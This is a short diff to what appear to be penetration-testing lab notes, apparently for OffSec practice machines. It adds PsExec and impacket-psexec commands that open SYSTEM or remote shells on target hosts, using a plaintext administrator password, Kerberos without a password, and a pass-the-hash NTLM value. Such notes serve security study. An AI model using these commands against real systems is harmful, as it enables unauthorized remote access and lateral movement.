@@ -24,4 +24,27 @@ UAC bypass ->
 
 ![[Pasted image 20240727221853.png]]
 
+```
+psexec -i -s cmd.exe
+```
+
+```
+impacket-psexec hutch.offsec/administrator:'1K#J}vjcK4&m%p'@TARGET
+```
+
+```
+sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip TARGET
+```
+
+```
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@TARGET
+```
+
+```
+PsExec.exe \\dc1 cmd.exe
+```
+
+```
+.\PsExec.exe \\files04 cmd
+```
 
